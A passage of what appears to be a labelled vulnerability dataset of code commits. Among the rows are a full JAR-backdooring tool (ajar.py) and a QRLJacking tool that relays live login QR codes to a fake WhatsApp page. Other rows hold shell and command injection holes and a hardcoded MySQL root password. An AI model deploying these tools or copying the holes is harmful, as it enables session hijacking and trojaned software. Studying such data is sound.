        cliq_args = {}
        cliq_args['serverName'] = connector['host']
        out = self._cliq_run_xml(""getServerInfo"", cliq_args, False)
        response = out.find(""response"")
        result = response.attrib.get(""result"")
        if result != '0':
            cliq_args = {}
            cliq_args['serverName'] = connector['host']
            cliq_args['initiator'] = connector['initiator']
            self._cliq_run_xml(""createServer"", cliq_args)

    def terminate_connection(self, volume, connector, **kwargs):
        """"""Unassign the volume from the host.""""""
        cliq_args = {}
        cliq_args['volumeName'] = volume['name']
        cliq_args['serverName'] = connector['host']
        self._cliq_run_xml(""unassignVolumeToServer"", cliq_args)

    def get_volume_stats(self, refresh):
        if refresh:
            self._update_backend_status()

        return self.device_stats

    def _update_backend_status(self):
        data = {}
        backend_name = self.configuration.safe_get('volume_backend_name')
        data['volume_backend_name'] = backend_name or self.__class__.__name__
        data['driver_version'] = '1.0'
        data['reserved_percentage'] = 0
        data['storage_protocol'] = 'iSCSI'
        data['vendor_name'] = 'Hewlett-Packard'

        result_xml = self._cliq_run_xml(""getClusterInfo"", {})
        cluster_node = result_xml.find(""response/cluster"")
        total_capacity = cluster_node.attrib.get(""spaceTotal"")
        free_capacity = cluster_node.attrib.get(""unprovisionedSpace"")
        GB = 1073741824

        data['total_capacity_gb'] = int(total_capacity) / GB
        data['free_capacity_gb'] = int(free_capacity) / GB
        self.device_stats = data
/n/n/n",1
100,100,5ed8aba271ad20e6168f2e3bd6c25ba89b84484f,"ajar.py/n/nimport zipfile, os, subprocess, shutil, sys, getopt, re

backdoor = target = None
outfile = ""backdoor.jar""

def main(argv):
    global backdoor, target, outfile
    help = 0
    try:
        opts, args = getopt.getopt(argv, ""b:t:o:"", [""backdoor="", ""target="", ""outfile=""])
    except getopt.GetoptError:
        print('USAGE:\tajar.py -b <backdoor.java> -t <target.jar> [-o <outfile.jar>]')
        sys.exit(2)
    for opt, arg in opts:
        if opt == '-h':
            help = 1
            print('USAGE:\tajar.py')
        elif opt in (""-b"", ""--backdoor""):
            backdoor = arg
        elif opt in (""-t"", ""--target""):
            target = arg
        elif opt in (""-o"", ""--outfile""):
            outfile = arg
            
    if (backdoor != None) & (target != None):
        try:
            start()
        except:
            print('[!] An error ocurred:\n')
            for e in sys.exc_info():
                print(e)
    elif help != 1:
        print('USAGE:\tajar.py -b <backdoor.java> -t <target.jar> [-o <outfile.jar>]')

def createZip(src, dst):
    zf = zipfile.ZipFile(""%s"" % (dst), ""w"")
    abs_src = os.path.abspath(src)
    for dirname, subdirs, files in os.walk(src):
        for filename in files:
            if filename != backdoor:
                absname = os.path.abspath(os.path.join(dirname, filename))
                arcname = absname[len(abs_src) + 1:]
                #print('[*] jaring %s as %s' % (os.path.join(dirname, filename), arcname))
                zf.write(absname, arcname)
    zf.close()
        
def start():
    print(""[*] Starting backdoor process"")
    print(""[*] Decompressing target to tmp directory..."")
    #subprocess.call(""jar -x %s"" % target, shell=True)
    with zipfile.ZipFile(target, 'r') as zip:
        zip.extractall(""tmp"")
    print(""[*] Target dumped to tmp directory"")

    print(""[*] Modifying manifest file..."")
    oldmain=""""
    man = open(""tmp/META-INF/MANIFEST.MF"",""r"").read()
    with open(""tmp/META-INF/MANIFEST.MF"",""w"") as f:
        for l in man.split(""\n""):
            if ""Main-Class"" in l:
                oldmain=l[12:]
                f.write(""Main-Class: %s\n"" % ""Backdoor"")
            else:
                f.write(""%s\n"" % l)
    print(""[*] Manifest file modified"")
    
    print(""[*] Modifying provided backdoor..."")
    inmain=False
    level=0
    bd=open(backdoor, ""r"").read()
    with open(""tmp/%s"" % backdoor,'w') as f:
        for l in bd.split(""\n""):
            if ""main("" in l:
                inmain=True
                f.write(l)
            elif ""}"" in l and level<2 and inmain:
                f.write(""%s.main(args);}"" % oldmain)
                inmain=False
            elif ""}"" in l and level>1 and inmain:
                level-=1
                f.write(l)
            elif ""{"" in l and inmain:
                level+=1
                f.write(l)
            else:
                f.write(l)
    print(""[*] Provided backdoor successfully modified"")

    print(""[*] Compiling modified backdoor..."")
    #if subprocess.call(""javac -cp tmp/ tmp/%s"" % backdoor, shell=True) != 0:
    if subprocess.call(['javac','-cp','tmp/','tmp/%s'%backdoor],shell=False) != 0:
        print(""[!] Error compiling %s"" % backdoor)
    print(""[*] Compiled modified backdoor"")
                
    if(len(oldmain)<1):
        print(""[!] Main-Class manifest attribute not found"")
    else:
        print(""[*] Repackaging target jar file..."")
        createZip(""tmp"",outfile)
        print(""[*] Target jar successfully repackaged"")
    shutil.rmtree('tmp/')
    
if __name__ == ""__main__"":
    main(sys.argv[1:])
/n/n/n",0
101,101,5ed8aba271ad20e6168f2e3bd6c25ba89b84484f,"/ajar.py/n/nimport zipfile, os, subprocess, shutil, sys, getopt, re

backdoor = target = None
outfile = ""backdoor.jar""

def main(argv):
    global backdoor, target, outfile
    help = 0
    try:
        opts, args = getopt.getopt(argv, ""b:t:o:"", [""backdoor="", ""target="", ""outfile=""])
    except getopt.GetoptError:
        print('USAGE:\tajar.py -b <backdoor.java> -t <target.jar> [-o <outfile.jar>]')
        sys.exit(2)
    for opt, arg in opts:
        if opt == '-h':
            help = 1
            print('USAGE:\tajar.py')
        elif opt in (""-b"", ""--backdoor""):
            backdoor = arg
        elif opt in (""-t"", ""--target""):
            target = arg
        elif opt in (""-o"", ""--outfile""):
            outfile = arg
            
    if (backdoor != None) & (target != None):
        try:
            start()
        except:
            print('[!] An error ocurred:\n')
            for e in sys.exc_info():
                print(e)
    elif help != 1:
        print('USAGE:\tajar.py -b <backdoor.java> -t <target.jar> [-o <outfile.jar>]')

def createZip(src, dst):
    zf = zipfile.ZipFile(""%s"" % (dst), ""w"")
    abs_src = os.path.abspath(src)
    for dirname, subdirs, files in os.walk(src):
        for filename in files:
            if filename != backdoor:
                absname = os.path.abspath(os.path.join(dirname, filename))
                arcname = absname[len(abs_src) + 1:]
                #print('[*] jaring %s as %s' % (os.path.join(dirname, filename), arcname))
                zf.write(absname, arcname)
    zf.close()
        
def start():
    print(""[*] Starting backdoor process"")
    print(""[*] Decompressing target to tmp directory..."")
    #subprocess.call(""jar -x %s"" % target, shell=True)
    with zipfile.ZipFile(target, 'r') as zip:
        zip.extractall(""tmp"")
    print(""[*] Target dumped to tmp directory"")

    print(""[*] Modifying manifest file..."")
    oldmain=""""
    man = open(""tmp/META-INF/MANIFEST.MF"",""r"").read()
    with open(""tmp/META-INF/MANIFEST.MF"",""w"") as f:
        for l in man.split(""\n""):
            if ""Main-Class"" in l:
                oldmain=l[12:]
                f.write(""Main-Class: %s\n"" % ""Backdoor"")
            else:
                f.write(""%s\n"" % l)
    print(""[*] Manifest file modified"")
    
    print(""[*] Modifying provided backdoor..."")
    inmain=False
    level=0
    bd=open(backdoor, ""r"").read()
    with open(""tmp/%s"" % backdoor,'w') as f:
        for l in bd.split(""\n""):
            if ""main("" in l:
                inmain=True
                f.write(l)
            elif ""}"" in l and level<2 and inmain:
                f.write(""%s.main(args);}"" % oldmain)
                inmain=False
            elif ""}"" in l and level>1 and inmain:
                level-=1
                f.write(l)
            elif ""{"" in l and inmain:
                level+=1
                f.write(l)
            else:
                f.write(l)
    print(""[*] Provided backdoor successfully modified"")

    print(""[*] Compiling modified backdoor..."")
    if subprocess.call(""javac -cp tmp/ tmp/%s"" % backdoor, shell=True) != 0:
        print(""[!] Error compiling %s"" % backdoor)
    print(""[*] Compiled modified backdoor"")
                
    if(len(oldmain)<1):
        print(""[!] Main-Class manifest attribute not found"")
    else:
        print(""[*] Repackaging target jar file..."")
        createZip(""tmp"",outfile)
        print(""[*] Target jar successfully repackaged"")
    shutil.rmtree('tmp/')
    
if __name__ == ""__main__"":
    main(sys.argv[1:])
/n/n/n",1
26,26,5a27336fbe3c220455a015f1bdc2621621f4bf40,"Server/model.py/n/nimport sqlalchemy
from sqlalchemy import text
from sqlalchemy.orm import sessionmaker, scoped_session

engine = sqlalchemy.create_engine('mysql+pymysql://root:bajtastore@127.0.0.1/mydb')
Session = scoped_session(sessionmaker(bind=engine))

def select_all_apps():
	return s.execute(""SELECT * FROM apps"").fetchall()

def select_all_apps_from_user(user_id):
	return s.execute(""SELECT * FROM apps a LEFT JOIN users_apps ua ON ua.app_id = a.id WHERE ua.user_id=?"", user_id)

def select_all_devices_from_user(user_id):
	return s.execute(""SELECT * FROM devices WHERE user_id=?"", user_id)/n/n/nServer/mysql_commands.py/n/nimport sqlalchemy
from sqlalchemy import text
from sqlalchemy.orm import sessionmaker, scoped_session

engine = sqlalchemy.create_engine('mysql+pymysql://root:bajtastore@127.0.0.1/mydb')
Session = scoped_session(sessionmaker(bind=engine))

s = Session()

def select_row_from_mysql_command(command_str):
    ''' function for selecting a specific row  '''
    ''' OUPUT: a list of elements in the selected row '''

    sql = text(str(command_str))
    return s.execute(sql).fetchall()


def insert_into_mysql_command(command_str):
        ''' the function inserts data depending from a command_str '''

        sql = text(str(command_str))
        s.execute(sql)
        s.commit()
/n/n/n",0
27,27,5a27336fbe3c220455a015f1bdc2621621f4bf40,"/Server/model.py/n/nfrom mysql_commands import *

def select_all_apps():
	return select_row_from_mysql_command(""SELECT * FROM apps"")

def select_all_apps_from_user(user_id):
	return select_row_from_mysql_command(""SELECT * FROM apps a LEFT JOIN users_apps ua ON ua.app_id = a.id WHERE ua.user_id=?"", user_id)

def select_all_devices_from_user(user_id):
	return select_row_from_mysql_command(""SELECT * FROM devices WHERE user_id=?"", user_id)/n/n/n/Server/mysql_commands.py/n/nimport sqlalchemy
from sqlalchemy import text
from sqlalchemy.orm import sessionmaker, scoped_session

engine = sqlalchemy.create_engine('mysql+pymysql://root:bajtastore@127.0.0.1/mydb')
Session = scoped_session(sessionmaker(bind=engine))

s = Session()

def select_row_from_mysql_command(command_str):
    ''' function for selecting a specific row  '''
    ''' OUPUT: a list of elements in the selected row '''

    sql = text(str(command_str))
    return s.execute(sql).fetchall()


def insert_into_mysql_command(command_str):
        ''' the function inserts data depending from a command_str '''

        sql = text(str(command_str))
        s.execute(sql)
        s.commit()
/n/n/n",1
44,44,82d92836d4ff78c623a0e06302c94cfa5ff79908,"tests/post/steps/test_dns.py/n/nimport os

from kubernetes import client, config
import pytest
from pytest_bdd import scenario, then, parsers
import yaml

from tests import utils


@pytest.fixture
def busybox_pod(kubeconfig):
    config.load_kube_config(config_file=kubeconfig)
    k8s_client = client.CoreV1Api()

    # Create the busybox pod
    pod_manifest = os.path.join(
        os.path.realpath(os.path.dirname(__file__)),
        ""files"",
        ""busybox.yaml""
    )
    with open(pod_manifest, encoding='utf-8') as pod_fd:
        pod_manifest_content = yaml.safe_load(pod_fd)

    k8s_client.create_namespaced_pod(
        body=pod_manifest_content, namespace=""default""
    )

    # Wait for the busybox to be ready
    def _check_status():
        pod_info = k8s_client.read_namespaced_pod(
            name=""busybox"",
            namespace=""default"",
        )
        assert pod_info.status.phase == ""Running"", (
            ""Wrong status for 'busybox' Pod - found {status}""
        ).format(status=pod_info.status.phase)

    utils.retry(_check_status, times=10)

    yield ""busybox""

    # Clean-up resources
    k8s_client.delete_namespaced_pod(
        name=""busybox"",
        namespace=""default"",
        body=client.V1DeleteOptions(),
    )


# Scenarios
@scenario('../features/dns_resolution.feature', 'check DNS')
def test_dns(host):
    pass


@then(parsers.parse(""the hostname '{hostname}' should be resolved""))
def resolve_hostname(busybox_pod, host, hostname):
    with host.sudo():
        # test dns resolve
        result = host.run(
            ""kubectl --kubeconfig=/etc/kubernetes/admin.conf ""
            ""exec -ti %s nslookup %s"",
            busybox_pod,
            hostname,
        )

        assert result.rc == 0, ""Cannot resolve {}"".format(hostname)
/n/n/ntests/post/steps/test_liveness.py/n/nimport json
import time

import pytest
from pytest_bdd import scenario, then, parsers

from tests import kube_utils
from tests import utils


# Scenarios
@scenario('../features/pods_alive.feature', 'List Pods')
def test_list_pods(host):
    pass


@scenario('../features/pods_alive.feature', 'Exec in Pods')
def test_exec_in_pods(host):
    pass


@scenario('../features/pods_alive.feature', 'Expected Pods')
def test_expected_pods(host):
    pass


# Then
@then(parsers.parse(
    ""the '{resource}' list should not be ""
    ""empty in the '{namespace}' namespace""))
def check_resource_list(host, resource, namespace):
    with host.sudo():
        output = host.check_output(
            ""kubectl --kubeconfig=/etc/kubernetes/admin.conf ""
            ""get %s --namespace %s -o custom-columns=:metadata.name"",
            resource,
            namespace,
        )

    assert len(output.strip()) > 0, 'No {0} found in namespace {1}'.format(
            resource, namespace)


@then(parsers.parse(
    ""we can exec '{command}' in the pod labeled '{label}' ""
    ""in the '{namespace}' namespace""))
def check_exec(host, command, label, namespace):
    candidates = kube_utils.get_pods(host, label, namespace)

    assert len(candidates) == 1, (
        ""Expected one (and only one) pod with label {l}, found {f}""
    ).format(l=label, f=len(candidates))

    pod = candidates[0]

    with host.sudo():
        host.check_output(
            'kubectl --kubeconfig=/etc/kubernetes/admin.conf '
            'exec --namespace %s %s %s',
            namespace,
            pod['metadata']['name'],
            command,
        )


@then(parsers.parse(
    ""we have at least {min_pods_count:d} running pod labeled '{label}'""))
def count_running_pods(host, min_pods_count, label):
    def _check_pods_count():
        pods = kube_utils.get_pods(
            host,
            label,
            namespace=""kube-system"",
            status_phase=""Running"",
        )

        assert len(pods) >= min_pods_count

    utils.retry(_check_pods_count, times=10, wait=3)
/n/n/ntests/post/steps/test_logs.py/n/nfrom pytest_bdd import scenario, then

# Scenarios
@scenario('../features/log_accessible.feature', 'get logs')
def test_logs(host):
    pass


@then(""the pods logs should not be empty"")
def check_logs(host):
    with host.sudo():
        pods_list = host.check_output(
            'kubectl --kubeconfig=/etc/kubernetes/admin.conf '
            'get pods -n kube-system '
            '--no-headers -o custom-columns="":metadata.name""'
        )
        for pod_id in pods_list.split('\n'):
            pod_logs = host.check_output(
                'kubectl --kubeconfig=/etc/kubernetes/admin.conf '
                'logs %s --limit-bytes=1 -n kube-system',
                pod_id,
            )

            if 'salt-master' not in pod_id:
                assert len(pod_logs.strip()) > 0, (
                    'Error cannot retrieve logs for {}'.format(pod_id))
/n/n/n",0
45,45,82d92836d4ff78c623a0e06302c94cfa5ff79908,"/tests/post/steps/test_dns.py/n/nimport os

from kubernetes import client, config
import pytest
from pytest_bdd import scenario, then, parsers
import yaml

from tests import utils


@pytest.fixture
def busybox_pod(kubeconfig):
    config.load_kube_config(config_file=kubeconfig)
    k8s_client = client.CoreV1Api()

    # Create the busybox pod
    pod_manifest = os.path.join(
        os.path.realpath(os.path.dirname(__file__)),
        ""files"",
        ""busybox.yaml""
    )
    with open(pod_manifest, encoding='utf-8') as pod_fd:
        pod_manifest_content = yaml.safe_load(pod_fd)

        k8s_client.create_namespaced_pod(
        body=pod_manifest_content, namespace=""default""
    )

    # Wait for the busybox to be ready
    def _check_status():
        pod_info = k8s_client.read_namespaced_pod(
            name=""busybox"",
            namespace=""default"",
        )
        assert pod_info.status.phase == ""Running"", (
            ""Wrong status for 'busybox' Pod - found {status}""
        ).format(status=pod_info.status.phase)

    utils.retry(_check_status, times=10)

    yield ""busybox""

    # Clean-up resources
    k8s_client.delete_namespaced_pod(
        name=""busybox"",
        namespace=""default"",
        body=client.V1DeleteOptions(),
    )


# Scenarios
@scenario('../features/dns_resolution.feature', 'check DNS')
def test_dns(host):
    pass


@then(parsers.parse(""the hostname '{hostname}' should be resolved""))
def resolve_hostname(busybox_pod, host, hostname):
        with host.sudo():
            # test dns resolve
            cmd_nslookup = (""kubectl --kubeconfig=/etc/kubernetes/admin.conf""
                            "" exec -ti {0} nslookup {1}"".format(
                                pod_name,
                                hostname))
            res = host.run(cmd_nslookup)
            assert res.rc == 0, ""Cannot resolve {}"".format(hostname)
/n/n/n/tests/post/steps/test_liveness.py/n/nimport json
import time

import pytest
from pytest_bdd import scenario, then, parsers

from tests import kube_utils
from tests import utils


# Scenarios
@scenario('../features/pods_alive.feature', 'List Pods')
def test_list_pods(host):
    pass


@scenario('../features/pods_alive.feature', 'Exec in Pods')
def test_exec_in_pods(host):
    pass


@scenario('../features/pods_alive.feature', 'Expected Pods')
def test_expected_pods(host):
    pass


# Then
@then(parsers.parse(
    ""the '{resource}' list should not be ""
    ""empty in the '{namespace}' namespace""))
def check_resource_list(host, resource, namespace):
    with host.sudo():
        cmd = (""kubectl --kubeconfig=/etc/kubernetes/admin.conf""
               "" get {0} --namespace {1} -o custom-columns=:metadata.name"")
        cmd_res = host.check_output(cmd.format(resource, namespace))
    assert len(cmd_res.strip()) > 0, 'No {0} found in namespace {1}'.format(
            resource, namespace)


@then(parsers.parse(
    ""we can exec '{command}' in the pod labeled '{label}' ""
    ""in the '{namespace}' namespace""))
def check_exec(host, command, label, namespace):
    candidates = kube_utils.get_pods(host, label, namespace)

    assert len(candidates) == 1, (
        ""Expected one (and only one) pod with label {l}, found {f}""
    ).format(l=label, f=len(candidates))

    pod = candidates[0]

    cmd = ' '.join([
        'kubectl',
        '--kubeconfig=/etc/kubernetes/admin.conf',
        'exec',
        '--namespace {0}'.format(namespace),
            pod['metadata']['name'],
            command,
    ])

    with host.sudo():
        host.check_output(cmd)


@then(parsers.parse(
    ""we have at least {min_pods_count:d} running pod labeled '{label}'""))
def count_running_pods(host, min_pods_count, label):
    def _check_pods_count():
        pods = kube_utils.get_pods(
            host,
            label,
            namespace=""kube-system"",
            status_phase=""Running"",
        )

        assert len(pods) >= min_pods_count

    utils.retry(_check_pods_count, times=10, wait=3)
/n/n/n/tests/post/steps/test_logs.py/n/nfrom pytest_bdd import scenario, then

# Scenarios
@scenario('../features/log_accessible.feature', 'get logs')
def test_logs(host):
    pass


@then(""the pods logs should not be empty"")
def check_logs(host):
    with host.sudo():
        cmd = ('kubectl --kubeconfig=/etc/kubernetes/admin.conf'
               ' get pods -n kube-system'
               ' --no-headers -o custom-columns="":metadata.name""')
        pods_list = host.check_output(cmd)
        for pod_id in pods_list.split('\n'):
            cmd_logs = ('kubectl --kubeconfig=/etc/kubernetes/admin.conf'
                        ' logs {} --limit-bytes=1 -n kube-system'.format(
                            pod_id))
            res = host.check_output(cmd_logs)
            if 'salt-master' not in pod_id:
                assert len(res.strip()) > 0, (
                    'Error cannot retrieve logs for {}'.format(pod_id))
/n/n/n",1
108,108,a101472db88764a0d031ef85fa283967b0692a77,"QrlJacking-Framework/QRLJacker.py/n/n#!/usr/bin/env python
#-*- encoding:utf-8 -*-
#Author:D4Vinci
import base64 ,time ,os ,urllib ,sys ,threading ,configparser
from binascii import a2b_base64

def clear():
	if os.name == ""nt"":
		os.system(""cls"")
	else:
		os.system(""clear"")

try:
	from PIL import Image
	import selenium
	from selenium import webdriver

except:
	print ""[!] Error Importing Exterinal Libraries""
	print ""[!] Trying to install it using pip""
	try:
		os.popen(""python -m pip install selenium"")
		os.popen(""python -m pip install Pillow"")
	except:
		try:
			os.popen(""pip install selenium"")
			os.popen(""pip install Pillow"")
		except:
			print ""[!] Can't install libraries ""
			print ""[!!] Try to install it yourself""
			exit(0)

finally:
	clear()
	from PIL import Image
	import selenium
	from selenium import webdriver

#settings = configparser.ConfigParser()

def Serve_it(port=1337):
	def serve(port):
		if os.name==""nt"":
			print "" [!] Serving files on ""+str(port)+"" port""
			os.popen(""python -m SimpleHTTPServer ""+str(port)+"" > NUL 2>&1"")
		else:
			print "" [!] Serving files on ""+str(port)+"" port""
			os.popen(""python -m SimpleHTTPServer ""+str(port)+"" > /dev/null 2>&1"")
	threading.Thread(target=serve,args=(port,)).start()

def create_driver():
	try:
		web = webdriver.Firefox()
		print "" [+]Opening Mozila FireFox...""
		return web
	except:
		try:
			web = webdriver.Chrome()
			print "" [+]Opening Google Chrome...""
			return web
		except:
			try:
				web = webdriver.Opera()
				print "" [+]Opening Opera...""
				return web
			except:
				try:
					web = webdriver.Edge()
					print "" [+]Opening Edge...""
					return web
				except:
					try:
						web = webdriver.Ie()
						print "" [+]Opening Internet Explorer...""
						return web
					except:
						print "" Error : \n Can not call webbrowsers\n  Check your pc""
						exit(0)

#Stolen from stackoverflow :D
def Screenshot(PicName ,location ,size):
	img = Image.open(PicName)#screenshot.png
	left = location['x']
	top = location['y']
	right = left + size['width']
	bottom = top + size['height']
	box = (int(left), int(top), int(right), int(bottom))
	final = img.crop(box) # defines crop points
	final.load()
	final.save(PicName)

def whatsapp():
	driver = create_driver()
	time.sleep(5)
	print "" [+]Navigating To Website..""
	driver.get('https://web.whatsapp.com/')
	time.sleep(5)

	while True:
		print ""-- --- -- --- -- --- -- --- -- --- --""
		try:
			button = driver.find_element_by_class_name('qr-button')
			print "" [!]Clicking to reload QR code image...""
			button._execute(selenium.webdriver.remote.command.Command.CLICK_ELEMENT)
			time.sleep(5)
		except:
			pass

		try:
			img = driver.find_elements_by_tag_name('img')[0]
			src = img.get_attribute('src').replace(""data:image/png;base64,"","""")
			print "" [+]The QR code image found !""
			print "" [+]Downloading the image..""
			binary_data = a2b_base64(src)
			qr = open(""tmp.png"",""wb"")
			qr.write(binary_data)
			print "" [#]Saved To tmp.png""
			qr.close()
			time.sleep(5)
			continue
		except:
			break

#make(""svg"")
def Yandex():
	print ""\n-- --- -- --- -- --- -- --- -- --- --""
	driver = create_driver()
	time.sleep(5)
	print "" [+]Navigating To Website..""
	driver.get(""https://passport.yandex.com/auth?mode=qr"")
	time.sleep(5)
	while True:
		print ""-- --- -- --- -- --- -- --- -- --- --""
		try:
			img_url = ""https://passport.yandex.com"" + driver.find_element_by_class_name(""qr-code__i"").get_attribute(""style"").split(""\"""")[1].encode(""utf-8"")
			print "" [+]The QR code image found !""
			data = urllib.urlopen(img_url).read()
			print "" [+]Downloading the image..""
			f = open(""tmp.svg"",""w"").write(data)
			print "" [#]Saved To tmp.svg""
			time.sleep(10)
			print "" [!]Refreshing page...""
			driver.refresh()
			continue
		except:
			break

def Airdroid():
	driver = create_driver()
	time.sleep(5)
	print "" [+]Navigating To Website..""
	driver.get(""http://web.airdroid.com"")
	time.sleep(5)
	img_number = 16
	refresh = 0
	while True:
		print ""-- --- -- --- -- --- -- --- -- --- --""
		try:
			button = driver.find_element_by_class_name(""widget-login-refresh-qrcode"")[0]
			print "" [!]Clicking to reload QR code image...""
			button._execute(selenium.webdriver.remote.command.Command.CLICK_ELEMENT)
			time.sleep(5)
		except:
			pass
		try:
			imgs = driver.find_elements_by_tag_name('img')
			img = imgs[img_number]
			print "" [+]The QR code image found !""
			src = img.get_attribute('src')
			print "" [+]Downloading the image..""
			qr = urllib.urlretrieve(src, ""tmp.png"")
			print "" [#]Saved To tmp.png""
			time.sleep(10)
			if refresh == 0:
				print "" [!]Refreshing page...""
				driver.refresh()
				refresh = 1
			img_number = 15
			continue
		except:
			break

def Weibo():
	driver = create_driver()
	time.sleep(5)
	print "" [+]Navigating To Website..""
	driver.get(""http://weibo.com/login.php"")
	time.sleep(5)
	while True:
		print ""-- --- -- --- -- --- -- --- -- --- --""
		try:
			imgs = driver.find_elements_by_tag_name('img')
			img = imgs[len(imgs)-1]
			print "" [+]The QR code image found !""
			src = img.get_attribute('src')
			print "" [+]Downloading the image..""
			qr = urllib.urlretrieve(src, ""tmp.png"")
			print "" [#]Saved To tmp.png""
			time.sleep(10)
			print "" [!]Refreshing page...""
			driver.refresh()
			continue
		except:
			break

def WeChat():
	driver = create_driver()
	time.sleep(5)
	print "" [+]Navigating To Website..""
	driver.get(""https://web.wechat.com"")
	time.sleep(5)
	while True:
		print ""-- --- -- --- -- --- -- --- -- --- --""
		try:
			imgs = driver.find_elements_by_tag_name('img')
			img = imgs[0]
			print "" [+]The QR code image found !""
			src = img.get_attribute('src')
			print "" [+]Downloading the image..""
			qr = urllib.urlretrieve(src, ""tmp.png"")
			print "" [#]Saved To tmp.png""
			time.sleep(10)
			continue
		except:
			break

def QQ():
	driver = create_driver()
	time.sleep(5)
	print "" [+]Navigating To Website..""
	driver.get(""http://w.qq.com"")
	time.sleep(10)
	while True:
		print ""-- --- -- --- -- --- -- --- -- --- --""
		try:
			driver.save_screenshot('tmp.png') #screenshot entire page
			img = driver.find_elements_by_tag_name(""img"")[0]
			print "" [+]The QR code image found !""
			location = img.location
			size = img.size
			print "" [+]Grabbing photo..""
			Screenshot(""tmp.png"" ,location ,size)
			print "" [#]Saved To tmp.png""
			webdriver.delete_all_cookies()
			time.sleep(10)
			print "" [!]Refreshing page...""
			driver.refresh()
			continue
		except:
			break

def Taobao():
	driver = create_driver()
	time.sleep(5)
	print "" [+]Navigating To Website..""
	driver.get(""https://login.taobao.com"")
	time.sleep(5)
	while True:
		print ""-- --- -- --- -- --- -- --- -- --- --""
		try:
			button_class = web.find_element_by_class_name(""msg-err"")
			button = button_class.find_elements_by_tag_name(""a"")[0]
			print "" [!]Clicking to reload QR code image...""
			button._execute(webdriver.remote.command.Command.CLICK_ELEMENT)
			time.sleep(5)
		except:
			pass
		try:
			imgs = driver.find_elements_by_tag_name('img')
			img = imgs[0]
			print "" [+]The QR code image found !""
			src = img.get_attribute('src')
			print "" [+]Downloading the image..""
			qr = urllib.urlretrieve(src, ""tmp.png"")
			print "" [#]Saved To tmp.png""
			time.sleep(10)
			continue
		except:
			break

def make(typ=""html""):
	if typ == ""html"":
		code = """"""<html>
<head><title>Whatsapp Web</title></head><body><script>
var myTimer;
myTimer = window.setInterval(reloadD,3000);
function reloadD(){
d = new Date();
document.getElementById('qrcodew').src=""tmp.png?h=""+d.getTime();
}
</script><center><h1><b>Scan Me Please</b></h1>
<img id=""qrcodew"" alt=""Scan me!"" src=""tmp.png"" style=""display: block;""></center>
</body></html>""""""

	if typ == ""svg"":
		code = """"""<html>
<head><title>Whatsapp Web</title></head><body><script>
var myTimer;
myTimer = window.setInterval(reloadD,3000);
function reloadD(){
d = new Date();
document.getElementById('qrcodew').src=""tmp.svg?h=""+d.getTime();
}
</script><center><h1><b>Scan Me Please</b></h1>
<object id=""qrcodew"" data=""tmp.svg"" type=""image/svg+xml""></object></center>
</body></html>""""""
	f = open(""index.html"",""w"")
	f.write(code)
	f.close()

def Simple_Exploit(classname,url,image_number,s=10):
	driver = create_driver()
	time.sleep(5)
	print "" [+]Navigating To Website..""
	driver.get(url)

	while True:
		print ""-- --- -- --- -- --- -- --- -- --- --""
		try:
			login = driver.find_element_by_class_name(classname)
			img = login.find_elements_by_tag_name('img')[int(image_number)]
			print "" [+]The QR code image found !""
			src = img.get_attribute('src')
			print "" [+]Downloading the image..""
			qr = urllib.urlretrieve(src, ""tmp.png"")
			print "" [#]Saved To tmp.png""
			time.sleep(s)
			print "" [!]Refreshing page...""
			driver.refresh()
			continue
		except:
			break

def main():
	#clear()
	print """"""\n
	  ___         _       _               _
	 / _ \  _ __ | |     | |  __ _   ___ | | __ ___  _ __
	| | | || '__|| |  _  | | / _` | / __|| |/ // _ \| '__|
	| |_| || |   | | | |_| || (_| || (__ |   <|  __/| |
	 \__\_\|_|   |_|  \___/  \__,_| \___||_|\_\\___||_|

# Hacking With Qrljacking Attack Vector Become Easy
# Coded By karim Shoair | D4Vinci

 Vulnerable Web Applications and Services:
  1.Chat Applications
  2.Mailing Services
  3.eCommerce
  4.Online Banking
  5.Passport Services
  6.Mobile Management Software
  7.Other Services
  8.Customization
""""""
	choice = input("" Choice > "")

	#Chat Applications
	if choice == 1:
		print """"""
 1.WhatsApp
 2.WeChat
 3.Line
 4.Weibo
 5.QQ Instant Messaging
 00.Back To Main Menu
	""""""

		choice_2 = raw_input("" Second Choice > "")

		if choice_2 == ""00"":
			main()

		#Whatsapp
		elif int(choice_2) == 1:
			port = raw_input("" Port to listen on (Default 1337) : "")
			try:
				int(userInput)
			except ValueError:
				port = 1337

			if port == """":
				port = 1337
			clear()
			make()
			Serve_it(port)
			whatsapp()
			main()

		#Wechat
		elif int(choice_2) == 2:
			port = raw_input("" Port to listen on (Default 1337) : "")
			if port == """":port = 1337
			clear()
			make()
			Serve_it(port)
			WeChat()
			main()

		#3

		#Weibo
		elif int(choice_2) == 4:
			port = raw_input("" Port to listen on (Default 1337) : "")
			if port == """":port = 1337
			clear()
			make()
			Serve_it(port)
			Weibo()
			main()

		elif int(choice_2) == 5:
			port = raw_input("" Port to listen on (Default 1337) : "")
			if port == """":port = 1337
			clear()
			make()
			Serve_it(port)
			QQ()
			main()

	#Mailing Services
	if choice == 2:
		print """"""
 1.QQ Mail
 2.Yandex Mail
 00.Back To Main Menu
	""""""
		choice_2 = raw_input("" Second Choice > "")

		if choice_2 == ""00"":
			main()

		elif int(choice_2) == 2:
			port = raw_input("" Port to listen on (Default 1337) : "")
			if port == """":port = 1337
			clear()
			make(""svg"")
			Serve_it(port)
			Yandex()
			main()

	#eCommerce
	if choice == 3:
		print """"""
 1.Alibaba
 2.Aliexpress
 3.Taobao
 4.Tmall
 5.1688.com
 6.Alimama
 7.Taobao Trips
 00.Back To Main Menu
	""""""
		choice_2 = raw_input("" Second Choice > "")
		if choice_2 == ""00"":
			main()

		elif int(choice_2) == 3:
			port = raw_input("" Port to listen on (Default 1337) : "")
			if port == """":port = 1337
			clear()
			make()
			Serve_it(port)
			Taobao()
			main()

		#4

		#5

		#6

		elif int(choice_2) == 7:
			port = raw_input("" Port to listen on (Default 1337) : "")
			if port == """":port = 1337
			clear()
			make()
			Serve_it(port)
			Taobao()
			main()

	#Online Banking
	if choice == 4:
		print """"""
 1.AliPay
 2.Yandex Money
 3.TenPay
 00.Back To Main Menu
	""""""
		choice_2 = raw_input("" Second Choice > "")
		if choice_2 == ""00"":
			main()

	#Passport Services
	if choice == 5:
		print """"""
 1.Yandex Passport
 00.Back To Main Menu
	""""""
		choice_2 = raw_input("" Second Choice > "")
		if choice_2 == ""00"":
			main()

	#Mobile Management Software
	if choice == 6:
		print """"""
 1.Airdroid
 00.Back To Main Menu
	""""""
		choice_2 = raw_input("" Second Choice > "")

		if choice_2 == ""00"":
			main()

		elif int(choice_2) == 1:
			port = raw_input("" Port to listen on (Default 1337) : "")
